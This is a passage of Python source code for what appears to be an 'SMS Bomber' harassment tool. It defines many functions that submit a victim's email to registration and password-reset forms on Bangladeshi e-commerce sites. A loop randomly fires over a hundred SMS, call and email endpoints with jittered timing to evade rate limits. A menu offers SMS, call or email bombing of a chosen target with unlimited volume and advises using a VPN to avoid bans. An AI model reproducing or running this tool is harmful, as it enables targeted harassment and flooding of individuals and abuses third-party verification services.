        api_name = "Email98 -  Electronicshopbd Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://electronicshopbd.com/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL98 - ElectronicShopBD Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL98 - ElectronicShopBD Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email99____makersbd_register(self):
        api_name = "Email99 -  Makersbd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.makersbd.com/customer/store"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL99 - MakersBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL99 - MakersBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email100____globalbrand_register(self):
        api_name = "Email100 -  Globalbrand Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.globalbrand.com.bd/index.php?route=account/register"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL100 - GlobalBrand Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL100 - GlobalBrand Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email101____globalbrand_forgot(self):
        api_name = "Email101 -  Globalbrand Forgot"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.globalbrand.com.bd/index.php?route=account/forgotten"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL101 - GlobalBrand Forgot", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL101 - GlobalBrand Forgot", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email102____orient_electronics_register(self):
        api_name = "Email102 -  Orient Electronics Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://orient-electronics.com/my-account-orient-electronics?action=register"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL102 - Orient Electronics Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL102 - Orient Electronics Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email103____orient_electronics_password_reset(self):
        api_name = "Email103 -  Orient Electronics Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://orient-electronics.com/my-account-orient-electronics/lost-password"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL103 - Orient Electronics Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL103 - Orient Electronics Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email104____abe_register(self):
        api_name = "Email104 -  Abe Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://abe.com.bd/customer-register"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL104 - ABE Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL104 - ABE Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email105____abe_forget_password(self):
        api_name = "Email105 -  Abe Forget Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://abe.com.bd/forgetpassword"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL105 - ABE Forget Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL105 - ABE Forget Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email106____nurtelecom_register(self):
        api_name = "Email106 -  Nurtelecom Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://nurtelecom.com.bd/my-account/?action=register"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL106 - NurTelecom Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL106 - NurTelecom Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email107____nurtelecom_password_reset(self):
        api_name = "Email107 -  Nurtelecom Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://nurtelecom.com.bd/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL107 - NurTelecom Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL107 - NurTelecom Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    async def bomb_task(self):
        data = load_data()
        external_only = data.get("settings", {}).get("external_only", False)
        
        if self.mode == 'sms':
            ext_apis = [lambda config=api: self.run_external_api(config) for api in self.external_apis if api.get("mode") == "sms" and api.get("enabled", True)]
            if external_only:
                apis = ext_apis
                if not apis:
                    logging.error(f"{R}[!] External API Only mode is ON but no external APIs are configured!{W}")
                    return
            else:
                apis = ext_apis + [
                self.api_api1___redx_signup, self.api_api2___khaasfood_otp, self.api_api3___bioscope_login, self.api_api4___bikroy_phone_login, self.api_api5___proiojon_signup, self.api_api6___beautybooth_signup, self.api_api7___medha_otp, self.api_api8___deeptoplay_login, self.api_api9___robi_otp, self.api_api10___arogga_sms, self.api_api11___mygp_otp, self.api_api12___bdstall_otp, self.api_api13___bcs_exam_otp, self.api_api14___doctorlive_otp, self.api_api15___sheba_otp, self.api_api16___apex4u_login, self.api_api17___sindabad_otp, self.api_api18___kirei_otp, self.api_api19___shikho_sms, self.api_api20___circle_signup, self.api_api21___bdtickets_auth, self.api_api22___grameenphone_otp, self.api_api23___rfl_bestbuy_login, self.api_api24___chorki_login, self.api_api25___hishab_express_login, self.api_api26___chorcha_auth_check, self.api_api27___wafilife_otp, self.api_api28___robi_account_otp, self.api_api29___chardike_otp, self.api_api30___e_testpaper_otp, self.api_api31___gpay_signup, self.api_api32___applink_otp, self.api_api33___priyoshikkhaloy, self.api_api34___kabbik_otp, self.api_api35___salextra, self.api_api36___sundora, self.api_api37___mygp_cinematic, self.api_api38___bajistar, self.api_api39___doctime, self.api_api40___grameenphone_fi, self.api_api41___meenabazar, self.api_api42___medeasy, self.api_api43___iqra_live, self.api_api44___chokrojan, self.api_api45___shomvob, self.api_api46___redx_signup_2, self.api_api47___mygp_send_otp, self.api_api48___bdjobs, self.api_api49___ultimate_organic_register, self.api_api50___ultimate_organic_forget, self.api_api51___foodaholic, self.api_api52___kfc_bd, self.api_api53___gp_offer_otp, self.api_api54___eonbazar_register, self.api_api55___eat_z, self.api_api56___osudpotro, self.api_api57___kormi24, self.api_api58___weblogin_gp, self.api_api59___shwapno, self.api_api60___quizgiri, self.api_api61___banglalink_mybl, self.api_api62___walton_plaza, self.api_api63___pbs, self.api_api64___aarong, self.api_api65___arogga_app, self.api_api66___sundarban_courier, self.api_api67___quiztime, self.api_api68___dressup, self.api_api69___ghoori_learning, self.api_api70___garibook, self.api_api71___fabrilife_signup, self.api_api72___fabrilife_otp, self.api_api73___btcl_bdia, self.api_api74___btcl_phonebill_register, self.api_api75___btcl_phonebill_login, self.api_api76___redx_merchant_otp, self.api_api77___khaasfood_digits_otp, self.api_api78___robi_web_otp, self.api_api79___sindabad_offers_otp_v2, self.api_api80___gp_fi_fwa_otp, self.api_api81___kabbik_otp_v2, self.api_api82___sundora_otp_backend, self.api_api83___walton_plaza_otp_v2, self.api_api84___btcl_mybtcl_register, self.api_api85___btcl_mybtcl_bcare, self.api_api86___ecourier_individual_otp, self.api_api87___carrybee_merchant_register, self.api_api88___carrybee_forget_password, self.api_api89___cartup_signup, self.api_api90___easyfashion_digits_otp, self.api_api91___sara_lifestyle_otp, self.api_api92___electronics_bangladesh_otp, self.api_api93___esquire_electronics_check_user, self.api_api94___sheba_electronics_otp, self.api_api95___sumash_tech_otp, self.api_api96___volthbd_registration, self.api_api97___rangs_shop_otp, self.api_api98___eyecon_app_transport, self.api_api99___vision_emporium_register, self.api_api100___basa18_sms, self.api_api101___pkluck_register, self.api_api102___pkluck_nologin_otp, self.api_api103___8mbets_register, self.api_api104___8mbets_new_mobile_request, self.api_api105___8mbets_forget_tac, self.api_api106___jayabaji_register, self.api_api107___jayabaji_new_mobile_request, self.api_api108___jayabaji_login_tac,
                self.api_api109___chaldal_otp, self.api_api110___pathao_otp, self.api_api111___sharetrip_otp, self.api_api112___shohoz_otp,
                self.api_api113___foodpanda_otp, self.api_api114___hungrynaki_otp, self.api_api115___rokomari_otp, self.api_api116___evaly_otp,
                self.api_api117___amarpay_otp, self.api_api118___pickaboo_otp, self.api_api119___ajkerdeal_otp, self.api_api120___priyoshop_otp
            ]
        elif self.mode == 'call':
            ext_apis = [lambda config=api: self.run_external_api(config) for api in self.external_apis if api.get("mode") == "call" and api.get("enabled", True)]
            if external_only:
                apis = ext_apis
            else:
                apis = ext_apis + [
                self.api_call1___robi_call_otp, self.api_call2___daraz_call_otp, self.api_call3___pathao_call_otp, self.api_call4___shohoz_call_otp,
                self.api_call5___chaldal_call_otp, self.api_call6___foodpanda_call_otp, self.api_call7___evaly_call_otp, self.api_call8___hungrynaki_call_otp,
                self.api_call9___rokomari_call_otp, self.api_call10___airtel_call_otp, self.api_call11___gp_call_otp_v2,
                self.api_call12___shikho_call_otp
            ]
        else:
            ext_apis = [lambda config=api: self.run_external_api(config) for api in self.external_apis if api.get("mode") == "email" and api.get("enabled", True)]
            if external_only:
                apis = ext_apis
            else:
                apis = ext_apis + [
                self.api_email1___bikroy_account, self.api_email2___bikroy_password_reset, self.api_email3___busbud_signup, self.api_email4___mithaibd_register, self.api_email5___saralifestyle_reset, self.api_email6___tohfay_register, self.api_email7___tohfay_forgot, self.api_email8___mrmedicinemart_signup, self.api_email9___mrmedicinemart_reset, self.api_email10___robishop_create, self.api_email11___robishop_reset, self.api_email12___singerbd_otp, self.api_email13___potakait_register, self.api_email14___electronicsbd_register, self.api_email15___electronicsbd_recovery, self.api_email16___globalbrand_register, self.api_email17___globalbrand_forgot, self.api_email18___zymak_register, self.api_email19___zymak_lost_password, self.api_email20___shopz_register, self.api_email21___shopz_lost_password, self.api_email22___xclusivebrands_register, self.api_email23___xclusivebrands_lost_password, self.api_email24___gamebuybd_register, self.api_email25___gamebuybd_lost_password, self.api_email26___gameforce_register, self.api_email27___gameforce_lost_password, self.api_email28___gamecastlebd_register, self.api_email29___gamecastlebd_lost_password, self.api_email30___techshopbd_signup, self.api_email31___electronicshopbd_ajax_register, self.api_email32___electronicshopbd_lost_password, self.api_email33___makersbd_register, self.api_email34___abe_register, self.api_email35___abe_forget_password, self.api_email36___colorcrazebd_signup, self.api_email37___colorcrazebd_reset, self.api_email38___chowdhuryelectronics_register, self.api_email39___smartview_register, self.api_email40___smartview_verify_resend, self.api_email41___smartview_password_code, self.api_email42___gadstyle_register, self.api_email43___gadstyle_lost_password, self.api_email44___havit_register, self.api_email45___havit_lost_password, self.api_email46___htebd_register, self.api_email47___htebd_lost_password, self.api_email48___shanbd_register, self.api_email49___quora_signup, self.api_email50___pinterest_signup,
                self.api_email51___shikho_email_otp, 
self.api_email52____bikroy_account, self.api_email53____bikroy_password_reset, self.api_email54____busbud_signup, self.api_email55____mithaibd_register, self.api_email56____sara_lifestyle_otp, self.api_email57____tohfay_register, self.api_email58____tohfay_forgot, self.api_email59____mrmedicinemart_signup, self.api_email60____mrmedicinemart_reset, self.api_email61____marhampharmacy_register, self.api_email62____giftinday_register, self.api_email63____giftinday_password_reset, self.api_email64____sentimentsexpress_register, self.api_email65____robishop_create, self.api_email66____robishop_reset, self.api_email67____clickbd_signup, self.api_email68____clickbd_recovery, self.api_email69____diamu_register, self.api_email70____diamu_password_reset, self.api_email71____zymak_register, self.api_email72____zymak_password_reset, self.api_email73____shopz_register, self.api_email74____shopz_password_reset, self.api_email75____xclusivebrands_register, self.api_email76____xclusivebrands_lost_password, self.api_email77____bdmanja_register, self.api_email78____bdmanja_password_reset, self.api_email79____xclusivebrands_register_2, self.api_email80____xclusivebrands_lost_password_2, self.api_email81____gameghor_register, self.api_email82____gameghor_password_reset, self.api_email83____potakait_register, self.api_email84____gamebuybd_register, self.api_email85____gamebuybd_lost_password, self.api_email86____gameforce_register, self.api_email87____gameforce_lost_password, self.api_email88____gamecastlebd_register, self.api_email89____gamecastlebd_lost_password, self.api_email90____techshopbd_signup, self.api_email91____electronics_register, self.api_email92____electronics_recovery, self.api_email93____electronics_bangladesh_otp, self.api_email94____singerbd_otp, self.api_email95____robotechbd_register, self.api_email96____robotechbd_lost_password, self.api_email97____electronicshopbd_register, self.api_email98____electronicshopbd_lost_password, self.api_email99____makersbd_register, self.api_email100____globalbrand_register, self.api_email101____globalbrand_forgot, self.api_email102____orient_electronics_register, self.api_email103____orient_electronics_password_reset, self.api_email104____abe_register, self.api_email105____abe_forget_password, self.api_email106____nurtelecom_register, self.api_email107____nurtelecom_password_reset
            ]
        while self.running and not self.stop_event.is_set():
            if self.limit != 0 and self.sent >= self.limit:
                self.running = False
                break

            # Filter out APIs that are currently in cooldown
            available_apis = []
            current_time = asyncio.get_event_loop().time()
            for api_func in apis:
                # Handle lambda functions (External APIs)
                if hasattr(api_func, "__name__") and api_func.__name__ == "<lambda>":
                    # For external APIs, we don't have a simple name, so we allow them
                    # or you could implement a more complex naming for lambdas
                    available_apis.append(api_func)
                    continue

                # Extract the display name part from the function name for matching
                parts = api_func.__name__.split('___') if hasattr(api_func, "__name__") else []
                if len(parts) > 1:
                    api_id = parts[0].replace('api_', '').upper()
                    api_name_part = parts[1].replace('_', ' ').title()
                    display_name = f"{api_id} - {api_name_part}"
                else:
                    display_name = api_func.__name__ if hasattr(api_func, "__name__") else "Unknown"
                
                if display_name.lower() not in self.api_cooldowns or current_time > self.api_cooldowns[display_name.lower()]:
                    available_apis.append(api_func)

            if not available_apis:
                logging.warning(f"{Y}[!] All APIs are in cooldown. Waiting for {self.backoff_time} seconds.{W}")
                await asyncio.sleep(self.backoff_time)
                continue

            batch_start_time = asyncio.get_event_loop().time()
            while (asyncio.get_event_loop().time() - batch_start_time) < self.request_batch_duration and self.running and not self.stop_event.is_set():
                api = random.choice(available_apis)
                
                # Hardcore Logic: Check if request should proceed
                hour = datetime.now().hour
                is_night = 0 <= hour <= 6
                if random.random() <= (0.05 if not is_night else 0.2):
                    await asyncio.sleep(random.uniform(0.3, 1.5))
                    continue

                async def run_api(api_func):
                    async with self.semaphore:
                        try:
                            await asyncio.sleep(random.uniform(0.3, 1.5))
                            await api_func()
                        except Exception as e:
                            pass

                asyncio.create_task(run_api(api))
                
                await asyncio.sleep(random.uniform(0.15, 0.75))

                if self.limit != 0 and self.sent >= self.limit:
                    self.running = False
                    break
            
            if self.running and not self.stop_event.is_set():
                logging.info(f"{P}[zzz] Script resting for {self.rest_duration} seconds...{W}")
                await asyncio.sleep(self.rest_duration)

async def main():
    while True:
        # Self-healing check: Even if someone tries to modify the function code in memory
        # the banner function itself enforces the links.
        clear()
        banner()

        print(f"{Y}[!] For optimal performance and to avoid IP bans, it is highly recommended to use a VPN service.")
        print(f"{Y}[!] Please connect your VPN to a stable location before starting.\n{W}")

        try:
            print(f"{C}[1] SMS Bombing")
            print(f"{C}[2] Call Bombing")
            print(f"{C}[3] Email Bombing")
            print(f"{C}[4] Saved Numbers")
            print(f"{C}[5] Settings & AI Control")
            print(f"{C}[E] Exit Project")
            choice = input(f"\n{Y}[?] Select Mode: {W}").lower()

            if choice == 'e':
                logging.info(f"{G}[✓] Thank you for using SMS Bomber!{W}")
                break

            if choice == '1' or choice == '2':
                mode = 'sms' if choice == '1' else 'call'
                target = input(f"{C}[?] Enter Target Number (e.g. 017xxxxxxxx): {W}")
                if len(target) != 11 or not target.isdigit():
                    logging.error(f"{R}[!] Invalid Number Format!{W}")
                    await asyncio.sleep(2)
                    continue
                # Save number system
                save_choice = input(f"{C}[?] Save this number? (y/n): {W}").lower()
                if save_choice == 'y':
                    name = input(f"{C}[?] Enter Name for this number: {W}")
                    save_number(name, target)
            elif choice == '3':
                mode = 'email'
                target = input(f"{C}[?] Enter Target Email: {W}")
                if "@" not in target:
                    logging.error(f"{R}[!] Invalid Email Format!{W}")
                    await asyncio.sleep(2)
                    continue
            elif choice == '4':
                target = list_saved_numbers()
                if not target:
                    continue
                mode_choice = input(f"{C}[?] Select Mode (1: SMS, 2: Call): {W}")
                mode = 'sms' if mode_choice == '1' else 'call'
            elif choice == '5':
                await settings_menu()
                continue
            else:
                logging.error(f"{R}[!] Invalid Choice!{W}")
                await asyncio.sleep(2)
                continue

            limit_input = input(f"{C}[?] Enter Bombing Limit (0 for Unlimited): {W}")
            limit = int(limit_input) if limit_input.isdigit() else 0

            tasks_count_input = input(f"{C}[?] Enter Concurrency Level (Default: 50): {W}")
            tasks_count = int(tasks_count_input) if tasks_count_input.isdigit() else 50

            logging.info(f"\n{Y}[*] Starting {mode.upper()} Bombing on {target} with {tasks_count} concurrent tasks...{W}")
            logging.info(f"{Y}[*] Press Enter to stop and return to menu.\n{W}")

            stop_event = asyncio.Event()
            async with AsyncBomber(target, limit, mode, stop_event, concurrency=tasks_count) as bomber:
                bombing_tasks = [asyncio.create_task(bomber.bomb_task()) for _ in range(tasks_count)]

                # Task to wait for user input to stop the bombing
                input_task = asyncio.create_task(asyncio.to_thread(input, ""))
                
                # Wait for either all bombing tasks to complete (if limit is set) or user input to stop
                # We want to stop if the user presses Enter (input_task) OR if all bombing tasks finish.
                # If limit is 0, bombing tasks will only finish if they crash or are cancelled.
                bombing_group = asyncio.gather(*bombing_tasks, return_exceptions=True)
                done, pending = await asyncio.wait([bombing_group, input_task], return_when=asyncio.FIRST_COMPLETED)

                # Signal stop
                bomber.running = False
                stop_event.set()

                # Cancel any remaining pending bombing tasks
                for task in pending:
                    task.cancel()
                await asyncio.gather(*pending, return_exceptions=True)

                # Clean up input task
                if not input_task.done():
                    input_task.cancel()
                try:
                    await input_task
                except asyncio.CancelledError:
                    pass

            logging.info(f"\n\n{G}[✓] Bombing Stopped!{W}")
            logging.info(f"{G}[+] Total Sent: {bomber.sent}{W}")
            logging.info(f"{R}[-] Total Failed: {bomber.failed}{W}")
            logging.info(f"{Y}[*] Detailed log saved to: {bomber.log_file}{W}")
            print(f"\n{C}Press Enter to return to main menu...{W}")
            input()

        except KeyboardInterrupt:
            logging.info(f"\n\n{R}[!] Use 'Enter' to stop bombing. Press 'Enter' again to exit project.{W}")
            try:
                input()
                break
            except:
                break
        except Exception as e:
            logging.error(f"\n{R}[!] Error: {e}{W}")
            await asyncio.sleep(3)

def main_entry():
    """Entry point for the console script."""
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main_entry()
